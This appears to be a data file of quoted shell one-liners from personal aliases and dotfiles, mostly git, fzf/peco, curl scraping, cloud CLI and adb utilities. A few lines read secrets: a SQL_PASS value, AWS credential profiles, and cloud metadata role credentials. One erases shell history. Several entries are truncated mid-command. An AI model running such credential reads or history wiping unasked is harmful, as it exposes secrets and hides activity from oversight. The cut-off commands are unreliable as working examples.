"cut -d: -f1 | uniq | sed -r ""s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g"""
"cut -d'|' -f1 | sort -u | perl -pe 's/ *r([0-9a-f]+) *\n/\1,/g'"
"cut -d"":"" -f1 | uniq | grep -vE ""\.pyc$|Binary """
"cut -d "":"" -f 1 | sort | uniq -c | sort -n -r"
"current_path=$(pwd) && cd $KRATOS_PATH/cmake_build && sed -i -e ""s/-DCMAKE_BUILD_TYPE=Release/-DCMAKE_BUILD_TYPE=FullDebug/g"" configure.sh && unbuffer sh $KRATOS_PATH/cmake_build/configure.sh 2>&1 | tee kratos.compile.log && cd $current_path || cd $current_path"
"current_path=$(pwd) && cd $KRATOS_PATH/cmake_build && sed -i -e ""s/-DCMAKE_BUILD_TYPE=FullDebug/-DCMAKE_BUILD_TYPE=Release/g"" configure.sh && unbuffer sh $KRATOS_PATH/cmake_build/configure.sh 2>&1 | tee kratos.compile.log && cd $current_path || cd $current_path"
"curl isthemissiononfire.com 2>/dev/null | grep h1 | sed ""s/<h1>//"" | sed ""s?</h1>??"""
"curl checkip.dyndns.org -s | sed ""s/[^0-9]*//"" | fgrep . | cut -d ""<"" -f 1"
"curl -so /tmp/weather http://wttr.in ; cat /tmp/weather | egrep -e ""City:|Feature:|@igor"" -v"
"curl -s https://www.bitstamp.net/api/ticker/ | jq "".last | tonumber"" | figlet -kcf big"
"curl -s https://www.archlinux.org/feeds/news/ | xmllint --xpath //item/title\ \|\ //item/pubDate /dev/stdin | sed -r -e ""s:<title>([^<]*?)</title><pubDate>([^<]*?)</pubDate>:\2\t\1\n:g"""
"curl -s https://www.archlinux.org/feeds/news/ | xmllint --xpath //item/title\ \|\ //item/pubDate /dev/stdin | sed -r -e ""s:<title>([^<]*?)</title><pubDate>([^<]*?)</pubDate>:\2\t\1\n:g"" && yay -Syu"
"curl -s https://mullvad.net/ -L | grep ""has-text-weight-bold has-text-danger"" | sed ""s/.*\"">//g"" | sed ""s/<.*//g"""
"curl -s http://whatthecommit.com/ | grep --color=no ""[<]p"" | egrep -v permalink | sed ""s@[<]p[>]\(.*\)@\1@"""
"curl -s http://localhost:8080/ec2/regions/us-east-2 | jq -r '.[] | select(.price < 0.40) | [.type , .price ] '"
"curl -s http://lipsum.com/feed/html | tr ""\n"" "" "" | sed s/^.*\>\ Lorem/Lorem/g | sed s/\<.p\>.*$//g"
"curl -s http://feeds.bbci.co.uk/news/rss.xml | grep ""<title>"" | sed ""s/ <title><\!\[CDATA\[//g;s/\]\]><\/title>//;"" | grep -v ""BBC News"""
"curl -s http://developerexcuses.com/ | grep nofollow | grep -Eo "">[^<]+"" | cut -b 2-"
"curl -s http://cbsg.sourceforge.net/cgi-bin/live | grep -Eo ""^<li>.*</li>"" | sed s,\</\\?li\>,,g | shuf -n 1"
"curl -s http://baba.mdja.jp/ | iconv -f Shift-JIS -t UTF-8 | grep -oE ""<span class=\""red\"">.{1,10}</span"" | grep -oE ""[0-9]+"" "
"curl -s http://127.0.0.1:4040/status | grep -P ""https://.*?ngrok.io"" -oh | tr -d ""\n"" | pbcopy"
"curl -s 'http://rss.accuweather.com/rss/liveweather_rss.asp?metric=1&locCode=en|uk|manchester' | sed -n '/Currently:/ s/.*: \(.*\): \([0-9]*\)\([CF]\).*/\2°\3, \1/p'"
"curl -s ""http://www.aviationweather.gov/adds/metars/index.php?submit=1&station_ids=karb,kdtw,kjxn,klan,kozw,kyip,kttf,konz,kdet,ktol,kgrr,kbtl&chk_tafs=on"" | html2text | sed ""1,4d"" | sed ""\$d"""
"curl -s ""http://thecatapi.com/api/images/get?format=xml"" | grep -o ""<url>[^<]*"" | cut -c6- | xargs curl -s -o /tmp/cat ; open -a Preview /tmp/cat"
"curl -Is slashdot.org | egrep ""^X-(F|B)"" | cut -d \- -f 2"
"curl -H 'Accept: application/json' ipinfo.io/json && echo -e '\n' && ifconfig -a | grep -o 'inet6\? \(addr:\)\?\s\?\(\(\([0-9]\+\.\)\{3\}[0-9]\+\)\|[a-fA-F0-9:]\+\)' | awk '{ sub(/inet6? (addr:)? ?/, \"
"curl -F c=@- https://ptpb.pw/?u=1 2>/dev/null | tee ""$TTY"" | tr -d ""\n"" | xclip"
"curl --silent https://www.mnlottery.com/games/lotto | html2text | sed -e 1,92d | vi -"
"curl --progress-bar ""https://wiki.archlinux.org/index.php/Unofficial_user_repositories"" | grep -B1 ""Server = "" | sed ""s/\$arch/$(uname -m)/g"" | cut -f 3 -d"" """
"curl ""https://wiki.archlinux.org/index.php/Unofficial_user_repositories"" | grep ""Server = "" | sed ""s/\$arch/$(uname -m)/g"" | cut -f 3 -d"" "" "
"ctags -uR --sort=yes --c++-kinds=+p --fields=+niaS --extra=+q --extra=+f $(find -regex "".*\.c\|.*\.cpp\|.*\.h\|.*\.hpp"")"
"crontab -l | grep ^@hourly | cut -f 2- -d "" "" | while read command; do eval $command; done"
"cowsay -l | sed ""1d""|tr "" "" ""\n""|while read f; do cowsay -f $f $f;done"
"cowsay -f $(basename $(echo /usr/share/cows/* | tr -s "" "" ""\n"" | shuf | head -1) .cow)"
"coredumpctl list -1 | sed -n ""2, 1p"" | awk ""{print $5}"" |coredumpctl dump $1 -o core"
"config | grep version | sed 's/,//g' | sed 's/\"
"config submodule init && cat .gitmodules | grep -Eo ""\""(.)*\"""" | cut -d ""\"""" -f 2 | xargs -I{} /usr/bin/git --git-dir=$HOME/.cfg/ --work-tree=$HOME submodule update --remote {}"
"compgen -c | sort -u | fzf --preview=""which {}"" | xargs -r swaymsg -t command exec"
"comm -23 <(rpm -q --queryformat ""%{NAME}\n"" $(for pkgname in `dnf leaves`; [[ ! $pkgname =~ -fonts- ]] && echo $pkgname;) | sort | uniq) <(sort $HOME/.dotfiles/fedora_worldfile) | peco >> $HOME/.dotfiles/fedora_worldfile"
"comm -23 <(pacman -Qqen | sort) <(pacman -Qqg base base-devel xorg-apps | sort) | less > ~/.pkglist && sed -i ""1ibase\\nbase-devel\\nxorg-apps"" ~/.dotfiles/arch_packages.txt"
"comm -23 <(pacman -Qqe | sort) <(pacman -Qqg base base-devel | sort) | tr ""\n"" "" """
"comm -23 <(apt-mark showmanual | sort -u) <(gzip -dc /var/log/installer/initial-status.gz | sed -n ""s/^Package: //p"" | sort -u)"
"color $(ls ""$BASE16_DIR"" | sed s/base16-//g | sed s/.sh//g | fzf --reverse)"
"clip_temp=$(xsel --clipboard);echo $(pwd)/$(normalize).pdf | xclip ; amv ""$(ls -tr | tail -n 1)"" reckless; echo $clip_temp | xclip "
"clear; ps -ef --forest | grep nick | grep -v grep | grep -v ""ps -ef --forest"""
"clear ; make 2>&1 | grep -E --color ""(\w+.java|[0-9]+|$)"""
"clear ; echo ; hostname ; ip addr show | grep --color=never ""inet "" | grep -v ""127.0.0.1"" | awk "
"clear && fortune | cowsay -f $(find /usr/share/cowsay*|grep ""[.]cow""| shuf -n1) -W $(($COLUMNS-15))"
"chruby $(chruby | sed ""s/\*/ /"" | awk ""{print $1}"" | fzf)"
"cheat -l | tail -n +2 | fzf | awk -v vars=""$*"" "
"cfendpoint | sed -e ""s/ec2-\([^.]*\).*/\1/"" | tr - . | sed -e ""s/$/.xip.io/"""
"cf apps | grep card-cont | perl -pne ""s{\s.+}{\n}xms"" | sort"
"cd_log;cat apps.out | grep -E ""ERROR|WARN"" | grep -v Lix"
"cd ~/workspace/$(ls -d ~/workspace/*/ | sed ""s/.*workspace//"" | sed ""s:/::g"" | fzf)"
"cd ~/Dropbox/Screenshots && compare -density 300 ""`ls -tr | tail -2|head -1`"" ""`ls -tr | tail -1`"" -compose src diff.png; open diff.png"
"cd ~/Code/app/storage/logs && tail -f -n 70 ""`ls | grep cli | tail -n 1`"" | grep -A50 ""ERROR"""
"cd /Users/y-tokoi/repos/my_favorit_memos; ruby main.rb --title | peco | awk -F "":"" ""{print $1}"" | xargs -I{} ruby main.rb --extract {}"
"cd .; clear; fortune | cowsay -f www; date --utc ""+%F %T %z"" --date ""now $(((RANDOM % 2)); echo + || echo -) $RANDOM days""; history -cw; rm --force ~/.bash_history"
"cd ${ORACLE_BASE}/diag/$([[ ${ORACLE_SID%%[1-9]} = ""+ASM"" ]] && echo ""asm"" || echo ""rdbms"")/$(echo ${ORACLE_SID%%[1-9]}|tr "
"cd ${ODIAG}/diag/`[[ ${OSID} == *""+ASM""* ]] && echo ""asm"" || echo ""rdbms""`/`echo ${OSID%[0-3]} |tr "
"cd ${!ODIAG}/diag/`[[ ${!OSID} == *""+ASM""* ]] && echo ""asm"" || echo ""rdbms""`/`echo ${!OSID%[0-9]} |tr "
"cd $HOME/svn/$(cd ~; find svn -type d -name .svn | sed -e ""s#^svn/\(.*\)/.svn#\1#g"" | sort | peco)"
"cd $HOME/git/$(cd ~; find git -type d -name .git | sed -e ""s#^git/\(.*\)/.git#\1#g"" | sort | peco)"
"cd $GOPATH/src/$(ghq list --full-path | grep $GOPATH | cut -d ""/"" -f 6,7,8 | peco)"
"cd $(git rev-parse --show-toplevel); gs --porcelain | egrep ""^ D"" | cut -c 4- | xargs git rm; cd -"
"cd $(ghq root)/$(ghq list --full-path | grep -v $GOPATH | cut -d ""/"" -f 5,6,7 | peco)"
"cd $(ghq list --full-path | peco --prompt=""ghq>"" || pwd)"
"cd $(find $GITHUB -maxdepth 2 -type d | fzf || echo ""."")"
"cd $(cdr -l | sed ""s/^[0-9]* *//"" | peco | xargs -Ipath zsh -c ""echo path"")"
"cd ""$( find -L ${PWD%/*}/ -maxdepth 1 -type d -not -name \"".*\"" | sort | grep -B 1 ../${PWD##*/} | head -n 1 )"""
"cd ""$( find -L ${PWD%/*}/ -maxdepth 1 -type d -not -name \"".*\"" | sort | grep -A 1 ../${PWD##*/} | tail -n 1 )"""
"cat ~/bin/spotifyplaylists.txt | fzf | cut -d "" "" -f 1,1 - | xargs open -a Spotify"
"cat ~/.ssh/config |grep ""Host "" |grep -v ""*"" |sed s/""^Host ""//"
"cat ~/.mish_production | grep SQL_PASS | cut -d= -f2 | sed ""s/"
"cat ~/.bash_aliases | grep -i ""tmux"" | cut -d "" "" -f 2- | tail -n +3"
"cat ~/.aws/credentials| grep ""^\["" | sed ""s/\[\(.*\)\]/\1/"" | sort"
"cat perfreport|c++filt |grep -i $@ |grep -i ""::"" --color=none"
"cat nohup.out ; tail log/regtest_log; cat log/regtest_log | g ""result \[""; cat log/regtest_log | g ""result \[0"";tail -f log/regtest_log | g ""result \[0"""
"cat cscope.TTT | fzf --reverse --color=light -i | tr -d ""\n"" | xclip "
"cat <(echo ""\$ $history[$HISTCMD]\n"" | sed -r ""s/\s*\|\s*txcc//"") - |txc"
"cat <(echo ""<b>\$ $history[$HISTCMD]</b>\n"" | sed -r ""s/\s*\|\s*txccb//"") - |txc"
"cat <(echo ""**\$ $history[$HISTCMD]**\n"" | sed -r ""s/\s*\|\s*txccm//"") - |txc"
"cat /var/log/mail.log | fgrep -v 'connect from localhost.localdomain[127.0.0.1]' | fgrep -v 'disconnect from localhost.localdomain[127.0.0.1]' | fgrep -v 'dovecot: imap-login: Aborted login (no auth attempts): rip=127.0.0.1, lip=127.0.0.1, secured'"
"cat /var/log/apt/history.log | grep ""apt-get install"" | sed ""s/.* //"" | catOrLessG"
"cat /proc/sys/kernel/randomize_va_space | grep 2 >> /dev/null && echo ""on"" || echo ""off"""
"cat /proc/meminfo |egrep -e ""Active:|Inactive:|MemFree:"""
"cat /proc/cpuinfo | grep ""siblings"" | sort -u | cut -d: -f2"
"cat /proc/cpuinfo | grep ""processor"" | uniq | wc -l"
"cat /proc/cpuinfo | grep ""physical id"" | uniq | wc -l"
"cat /proc/cpuinfo | grep ""physical id"" | sort -u | wc -l"
"cat /etc/passwd |grep ""/bin/bash"" |grep ""[5-9][0-9][0-9]"" |cut -d: -f1"
"cat /etc/os-release | grep ""^NAME="" | cut -d""="" -f 2 | tr -d \"""
"cat /etc/apache2/extra/httpd-vhosts.conf | grep -E ""ServerName|ServerAlias"" | grep -v ""#"""
"cat /dev/urandom|tr -dc ""a-zA-Z0-9-_\$\?""|fold -w 9|head"
"cat /dev/urandom|tr -dc ""a-zA-Z0-9-_\$\?""|fold -w 64|head"
"cat /dev/urandom | tr -dc ""a-zA-Z0-9"" | fold -w 32 | head -n"
"cat /dev/urandom | tr -dc ""a-zA-Z0-9"" | fold -w 32 | head -n 1"
"cat /dev/urandom | tr -dc ""a-zA-Z0-9"" | fold -w 128 | head -n 1"
"cat /dev/urandom | tr -dc ""[:graph:]"" | fold -w 16 | head -1"
"cat /dev/urandom | tr -dc ""[:graph:]"" | fold -w 10 | head -n 1"
"cat /dev/urandom | tr -dc ""A-Za-z0-9\\\!\#\""\$\%\&\-\`=^~|()@[]{};:+*,./<>?_"" | head -c"
"cat /dev/urandom | hexdump -e ""`echo $COLUMNS*1.0/3.0 | bc`/1 \""%02x \"" \""\n\"""" | lolcat -F 0.01"
"cat /dev/urandom | hexdump -C | highlight ca fe 3d 42 e1 b3 ae f8 | perl -MTime::HiRes -pnE ""Time::HiRes::usleep(rand()*1000000)"""
"cat /dev/urandom | gtr -d -c ""a-km-zA-HJ-NP-Z2-9"" | gfold -w 16 | head -1"
"cat /dev/urandom | env LC_CTYPE=C LC_ALL=C gtr -d -c ""a-km-zA-HJ-NP-Z2-9[:graph:]"" | gfold -w 16 | head -1"
"cat /dev/random| tr -dc ""\40-\176"" | fold -w 16| head -n 1"
"cat ${YOCTO_DETAILS_PATH} | grep ""DISTRO_NAME\|DISTRO_CODENAME\|DISTRO_VERSION"""
"cat $REPOENV/shell/alias.sh | grep -i ""^alias"" | cut -c7- | cut -d""="" -f1"
"cat $(findmakefile) | grep LOCAL_PRIVILEGED_MODULE | egrep -o ""= .*"" | egrep -o ""[A-Za-z0-9].*"""
"cal | head -n 1; cal | tail -n +2 | grep --before-context 6 --after-context 6 --color -e "" $(date +%e)"" -e ""^$(date +%e)"""
"cal | grep -C6 --color -E ""(\s|^)$(date +""%e"")(\s|$)"""
"cabal list --simple-output --installed | awk ""{print $1}"" | uniq | xargs -I {} cabal install {} --reinstall"
"bundle exec rubocop $(git status --short | grep -e "".*\.rb"" | sed s/M// | sed s/D.*//)"
"bundle exec rubocop $(git status --short | grep -e "".*\.rb"" | sed s/M// | sed s/D.*//) -a"
"bundle exec rspec $(git diff --diff-filter=AM --name-status master..HEAD | grep _spec.rb | cut -c 3- | paste -sd "" "")"
"bundle check || bundle install | grep -v ""Using """
"bugzilla --ensure-logged-in query --product ""Red Hat Enterprise Linux 7"" --component sos -t NEW,ASSIGNED,POST,MODIFIED,ON_DEV,ON_QA --outputformat ""%{id} | %{bug_status} | %{assigned_to} | %{short_desc}"""
"bugzilla --ensure-logged-in query --product ""Red Hat Enterprise Linux 7"" --component sos -t NEW --outputformat ""%{id} | %{bug_status} | %{assigned_to} | %{short_desc}"""
"bugzilla --ensure-logged-in query --product ""Red Hat Enterprise Linux 6"" --component sos -t NEW,ASSIGNED,POST,MODIFIED,ON_DEV,ON_QA --outputformat ""%{id} | %{bug_status} | %{assigned_to} | %{short_desc}"""
"bugzilla --ensure-logged-in query --product ""Red Hat Enterprise Linux 6"" --component sos -t NEW --outputformat ""%{id} | %{bug_status} | %{assigned_to} | %{short_desc}"""
"brew update && brew upgrade --all && brew cleanup && docker images | grep ""<none>"" | awk ""{ print $3 }"" | xargs docker rmi"
"brew cask update; brew update --verbose; brew upgrade --all --verbose; for c in $(brew cask list); do ! brew cask info $c | grep -qF ""Not installed"" || { brew cask uninstall $c --force && brew cask install $c }; done; brew cleanup; brew cask cleanup"
"branch_files | grep ""\.\(rb\|gemspec\)$"" | xargs rubocop"
"bqueues | egrep ""(QUEUE_NAME|serial|gams)"""
"bind -P | grep -v ""is not"" | sed -e ""s/can be found on/:/"" | column -s: -t"
"battery-info | grep -E ""state|to\ full|percentage"""
"bash -c ""cd ~/.bin/git && git fetch --verbose && git checkout \$(git log --simplify-by-decoration --decorate --oneline origin/master | sed -n \""/tag: v[0-9.]*[),]/{s/.*tag: \\(v[^),]*\\).*/\\1/;p;q}\"") && make clean && make PROFILE=BUILD NO_EXPAT=YesPlease NO_TCLTK=YesPlease install || echo -e \\\\e[1\;31mum...problems?"""
"basetag=$(date +""release-%Y%m%d""); count=$((git tag | grep -c $basetag ) || true); ((++count)); TAG=""${basetag}-$count""; git tag $TAG; git push --tag"
"based-connect $(echo ""paired-devices"" | bluetoothctl | grep -o ""\S* [LE-]*Bose QC35"" | grep -o ""\S*:\S*"")"
"backblaze-b2 list-file-names cfrq-backups | jq -r '.files[] | [.fileName ,.size] | @tsv'"
"az account list --all --query 'sort_by([],&tenantId)|[].{Name:name,CloudName:cloudName,SubscriptionId:id,TenantId:tenantId,State:state,IsDefault:isDefault}' -o table | grep -E --color '^.*True.*|$'"
"aws.pl dtags --filter resource-type=instance | grep Name | awk ""{print \$2,\$8}"" | sort -k 2"
"aws s3api list-buckets | jq -r "".Buckets[] | .Name"" | sort"
"aws lambda list-functions | jq "".Functions | .[].FunctionName"" | fzf"
"aws ec2 describe-instances | jq -r '.Reservations[].Instances[] | [.Tags[].Value, .PublicDnsName,.PrivateDnsName] | @tsv'"
"aws ec2 describe-instances | jq -r '.Reservations[].Instances[] | [.InstanceId, .NetworkInterfaces[].PrivateIpAddress, (.Tags[]|select(.Key==\"
"aws ec2 describe-instances | jq '.Reservations[].Instances[] | {IP: .PrivateIpAddress, ID: .InstanceId, Name: .Tags[] | select(.Key==\"
"aws ec2 describe-images --owners self amazon | jq -r "".Images[] | [.ImageId, .CreationDate, .Name, .Architecture] | @tsv"""
"aws ec2 describe-availability-zones --region $AWS_DEFAULT_REGION | jq --raw-output "".AvailabilityZones | map(.ZoneName) | .[]"""
"aws cloudfront list-distributions | jq '.DistributionList.Items | .[] | { id: .Id, domain: .Aliases.Items[0], status: .Status }'"
"awk ""{print $5}"" | cut -d""/"" -f3 | cut -d ""."" -f1 | xargs -I {} pkill {}"
"asdf list-all ruby | sed s/\\s/\\n/g | grep ""^[^a-zA-Z]"" | tail"
"arp-scan -l -I $(ifconfig |grep flag|grep -v lo |cut -f1 -d"":"")"
"arp-scan -l -I $(ifconfig |grep ""flag"" |grep -v ""lo"" |cut -f1 -d"":"")"
"arp -a | grep microserver | cut -d ""("" -f2 | cut -d "")"" -f1"
"arp -a | grep joggler | cut -d ""("" -f2 | cut -d "")"" -f1"
"aptitude -o ""Aptitude::Pkg-Display-Limit=( ^lib !-dev$ !-dbg$ !-utils$ !-tools$ !-bin$ !-doc$ !-progs$ !-clients$ !-examples$ !^libreoffice | -data$ | -common$ | -base$ !^r-base ) !~M ~i"""
"apt-cache search emacs | cut -f 1 -d "" "" | sort | grep -e ""^emacs[0-9][0-9]$"""
"apt-cache search clang | cut -f 1 -d "" "" | sort | grep -e ""^clang-[0-9].[0-9]$"""
"apt-cache search . | awk ""{print \$1}"" | fzf -m --preview ""apt-cache show {1}"" | xargs -r sudo apt install -y"
"apt-cache policy |grep http |awk ""{print $2 $3}"" |sort -u"
"aplay -l | awk -F \: '/,/{print $2}' | awk '{print $1}' | uniq"
"ansible all -m ping | ansible2json | table --in json --out fixed --order host,result | headingsort"
"amixer | head -5 |tail -1 |cut -d"" "" -f6"
"amixer set PCM -- $[$(amixer get PCM| grep -n -o ""[0-9]*%"" | sed ""s/%//""| sed ""s/[0-9]://"")-2]%"
"amixer get Master | sed '1,4 d' | cut -d [ -f 2 | cut -d ] -f 1"
"aliyun --mode EcsRamRole --ram-role-name $(curl -s 100.100.100.200/latest/meta-data/ram/security-credentials/) --region $(curl -s 100.100.100.200/latest/meta-data/region-id) ecs DescribeInstances --InstanceIds [""\""$(curl -s 100.100.100.200/latest/meta-data/instance-id)\""""] | jq -Mcr ""[.Instances.Instance[].Tags.Tag[]|{(.TagKey):.TagValue}]|add"""
"alias | grep -e ""g[0-9]="" | grep -v ""m[0-9]"" | sed ""s/^g/alias g/g"""
"alias | grep -e ""g[0-9]="" | grep -v ""m[0-9]"" | sed ""s/^g/alias g/g"" > ~/.bookmarks"
"alias | grep -e ""alias g[0-9]""|grep -v ""alias m""|sed ""s/alias //"""
"alias | grep -e ""alias g[0-9]"" | grep -v ""alias m"" | sed ""s/alias //"""
"alias | grep -e ""alias d[0-9]""|grep -v ""alias m""|sed ""s/alias //"""
"alias | grep ""[v]lc -Idummy"" | grep -o "".*="" | cut -d= -f1"
"alias | grep ""[s]treamlink"" | grep -o "".*="" | cut -d= -f1"
"alias | egrep ""alias d"" | egrep -v "" df| du"" && declare -f deb && declare -f drestart && declare -f container_id"
"alias | cut -d= -f1 && declare -F | cut -d ' ' -f 3 | sed 's,^,function ,'"
"alias adb=""adb devices | tail -n +2 | cut -sf 1 | xargs -I {} -p adb -s {}"""
"ag -G ""\.c$|\.cc$|\.cpp$|\.c\+\+$"""
"ag -G "".*\.(cpp|h|hpp|cc)"""
"ag --ruby --coffee ""console.log|binding.pry|\*888|save_and_open_screenshot"""
"ag --ignore ""*.[js|cache|tpm|log]*"""
"ag ""TODO|FIXME|REMOVE|boris"""
"ag ""(?<=gulp.task\(.)[a-z0-9:-]+"" --nofilename --nonumber -o --nocolor | grep . | fzf | xargs $(npm bin)/gulp"
"adb shell pm list package -f | sed -e ""s/package:\([^=]*\).*/\1/g"" | fzf | xargs adb pull"
"adb shell dmesg | grep -E ""iwl|wlan|80211"""
"adb logcat | grep ""$1"" | sed ""s/^I\/$1(.*):\s/log: /g"" | sed ""s/at file:.*$//g"""
"adb logcat -v threadtime | grep -i ""AndroidRuntime\|System.err\|Exception"""
"adb logcat -d -v threadtime | egrep -i ""(system.err|androidruntime|exception)"""
"adb devices | tail -n +2 | cut -sf 1 | xargs -I {} adb -s {} uninstall se.footballaddicts.livescore.devop && say -v Nora ""Fårza fotbold ble nettopp avinstallert"""
"adb devices | tail -n +2 | cut -sf 1 | xargs -I {} adb -s {} shell pm clear se.footballaddicts.livescore.devop && say -v Nora ""Fårza fotbold data ble nettopp manglet"""
"adb connect $(adb shell ifconfig wlan0 | grep ""inet addr"" | cut -f2 -d: | cut -f1 -d"" ""):5555"
"adb -d shell ip addr show wlan0 | egrep -o ""172\.[^\. ]*.[^\. ]*\.[^\. ]*| 192\.168\.[^\. ]*\.[^\. ]*"" | head -n 1"
"acpi|tr ' ' '\n'|grep '%'|tr -d '%,'"
"acpitool --battery | grep Remaining | cut -d' ' -f10 | cut -d',' -f1"
"ack-grep ""^\s*(Given|When|Then)"" --features | grep "
"ack ""TODO|FIXME|DOCME|TESTME"""
"`ps auxww | grep Minefield | grep -v grep | awk ""{print \""gdb \"" \\$11 \"" \"" \\$2}""`"
"`ps aux | awk '{print $6/1024 "" MB\t\t"" $11}' | sort -rn | head -n5`"
"`list-all-files | peco --prompt ""FILES>"" | head -n 1 | sed -e ""s/^\*\s*//g""`"
"`kubectl get pods | grep web-$(kubectl describe svc production | grep ""^Selector:"" | sed -e "
"`history | awk '{a[$2]++}END{for(i in a){print a[i] "" "" i}}' | sort -rn | head`"
"`grep -iE ""^host\s+(\w|\d)+"" ~/.ssh/config | cut -d"" "" -f2 | peco`"
"`git status -s | egrep ""^ +[MA]"" | awk ""{print\\$2}"" | peco`"
"`git log --oneline | peco | sed -e ""s/^.*\* *\([a-f0-9]*\) .*/\1/g"" -e ""s/^[\|/ ]*$//g""`"
"`git log --decorate --branches --all --graph --oneline --all | peco | sed -e ""s/^.*\* *\([a-f0-9]*\) .*/\1/g"" -e ""s/^[\|/ ]*$//g""`"
"`git log --date=short --pretty=""format:%h %cd %an%d %s"" | percol --prompt ""GIT SHA1>"" | head -n 1 | sed ""s/^\([0-9a-f]*\).*/\1/""`"
"`git branch | peco --prompt ""GIT BRANCH>"" | head -n 1 | sed -e ""s/^\*\s*//g""`"
"`git branch | fzf --reverse --ansi --prompt ""git branch> "" | head -n 1 | sed -e ""s/^\*\s*//g""`"
"`git branch | fzf --prompt ""Branches>"" | head -n 1 | sed -e ""s/^\*\s*//g""`"
"`git branch | $FILTERING_TOOL --prompt ""GIT BRANCH>"" | head -n 1 | sed -e ""s/^\*\s*//g""`"
"`git branch -r | peco --prompt ""Remote Branches>"" | head -n 1 | sed -e ""s/^\*\s*//g""`"
"`git branch -r | peco --prompt ""GIT REMOTE BRANCH"" | head -n 1 | sed ""s/^ \(.*\)\/\(.*\)/\2 \1\/\2/""`"
"`git branch -r | fzf --reverse --ansi --prompt ""git remote branch> "" | head -n 1 | sed -e ""s/^\*\s*//g""`"
"`git branch -r | fzf --prompt ""Remote Branches>"" | head -n 1 | sed -e ""s/^\*\s*//g""`"
"`git branch -a | peco | head -n 1 | sed -e ""s/^\*\s*//g""`"
"`git branch -a | peco --query ""remotes/ "" --prompt ""GIT REMOTE BRANCH>"" | head -n 1 | sed ""s/remotes\/[^\/]*\/\(\S*\)/\1/""`"
"`git branch -a | peco --query ""remotes/ "" --prompt ""GIT REMOTE BRANCH>"" | head -n 1 | sed ""s/remotes\/[^\/]*\/\(\S*\)/\1 \0/""`"
"`git branch -a | peco --prompt ""GIT BRANCH>"" | head -n1 | sed -e ""s/^\*\s*//g""`"
"`git branch -a | peco --prompt ""GIT BRANCH>"" | head -n 1 | sed -e ""s/^\*\s*//g""`"
"`git branch -a | peco --prompt ""GIT BRANCH"" | head -n 1 | sed -e ""s/^\*\s*//g""`"
"`git branch -a | peco --prompt ""GIT BRANCH >"" | head -n 1 | sed -e ""s/^\*\s*//g""`"
"`git branch -a | fzf --query ""remotes/ "" --prompt ""GIT REMOTE BRANCH>"" | head -n 1 | sed ""s/remotes\/[^\/]*\/\(\S*\)/\1 \0/""`"
"`git branch -a | fzf --prompt ""GIT BRANCH>"" | head -n 1 | sed -e ""s/^\*\s*//g""`"
"`git branch --remote | peco --prompt ""GIT BRANCH>"" | head -n 1 | sed -e ""s/^\*\s*//g""`"
"`gbc | peco --prompt ""[GIT BRANCH]> "" | sed -e ""s/^\* //g"" | awk ""{print $1}""`"
"`echo -e $(sudo pacman -Sy $(pacman -Sy $@|head -1|cut -f2 -d ""/""|awk '{print $1}')) # pacman search install 1st app found, useful for a direct search fast install"
"`docker ps | tail -n +2 | peco | cut -d"" "" -f1`"
"`docker ps | tail -n +2 | ${INTERACTIVE_FILTER} | cut -d"" "" -f1`"
"`docker ps -a | tail -n +2 | peco | cut -d"" "" -f1`"
"`docker images | peco | sed -e ""s/ */ /g"" | cut -d"" "" -f3`"
"`curl -u <token>:x-oauth-basic -s https://api.github.com/orgs/<organization>/repos\?per_page\=200 | ruby -rubygems -e 'require ""json""; JSON.load(STDIN.read).each { |repo| %x[git clone #{repo[""ssh_url""]} ]}'`"
"`curl -sL https://api.github.com/users/yuzuemon/repos | jq -r "".[].full_name"" | peco --prompt ""GITHUB REPOS>"" | head -n 1`"
"`curl -sL https://api.github.com/users/yuukigoodman/repos | jq -r "".[].full_name"" | peco --prompt ""GITHUB REPOS>"" | head -n 1`"
"`curl -sL https://api.github.com/users/remyroez/repos | jq -r "".[].full_name"" | peco --prompt ""GITHUB REPOS>"" | head -n 1`"
"`curl -sL https://api.github.com/users/pirosikick/repos | jq -r "".[].full_name"" | peco --prompt ""GITHUB REPOS>"" | head -n 1`"
"`curl -sL https://api.github.com/users/otofu-square/repos | jq -r "".[].full_name"" | peco --prompt ""GITHUB REPOS>"" | head -n 1`"
"`curl -sL https://api.github.com/users/larufa/repos | jq -r "".[].full_name"" | peco --prompt ""GITHUB REPOS>"" | head -n 1`"
"`curl -sL https://api.github.com/users/flaflasun/repos | jq -r "".[].full_name"" | peco --prompt ""GITHUB REPOS>"" | head -n 1`"
"`curl -sL https://api.github.com/users/dealforest/repos | jq -r "".[].full_name"" | peco | sed -e ""s/^\*[ ]*//g""`"
"`curl -sL https://api.github.com/users/ctare/repos | jq -r "".[].full_name"" | peco --prompt ""GITHUB REPOS>"" | head -n 1`"
"`curl -sL https://api.github.com/users/beatinaniwa/repos | jq -r "".[].full_name"" | peco --prompt ""GITHUB REPOS>"" | head -n 1`"
"`curl -sL https://api.github.com/users/YOUR_USERNAME/repos | jq -r "".[].full_name"" | peco --prompt ""GITHUB REPOS>"" | head -n 1`"
"`curl -sL https://api.github.com/users/2k0ri/repos | jq -r "".[].full_name"" | peco --prompt ""GITHUB REPOS>"" | head -n 1`"
"`curl -sL https://api.github.com/users/$(git config --global user.name)/repos | jq -r "".[].full_name"" | fzf +m --prompt ""GITHUB REPOS>"" | head -n 1`"
"`bundle exec kitchen list | tail -n +2 | peco | cut -d"" "" -f1`"
"_end(){ hexdump -C ""$1"" | grep --color -E "" 0a| 0d|$""; };_end "
"__lambda() { cat $1 | sed ""1d"" | sed ""\$d"" | tr -d ""\n"" ; } ; __lambda"
"_(){ svn revert -R .; svn st --ignore-externals | grep ""^?"" | cut -c9- | xargs rm -rf; svn cleanup . }; _"
"_(){ main=\${1}; ((\$#==0)) && starturl=\""infocat\"" || { shift; starturl=\""info2html?(\${main})\$(sed \""s/ /%2520/g\"" <<< \""\${@:-TOP}\"")\"";}; port=${PHP_PORT}; netstat -an | { ! grep -q \"":\${port}.*LISTEN\""; } && (php -S localhost:\${port} -t / $(pwd)/routing.php &>\""${DISCARD_DEV}\"" & ); firefox \""http://localhost:\${port}/\${starturl}\""; }; _"
"_(){ (la $@| \grep ^l; )||( echo ""No linked files found!"";) }; _"
"_(){ ( ll $@| grep -v ^[dl]; )||( echo ""No files in this folder\!""; ) }; _"
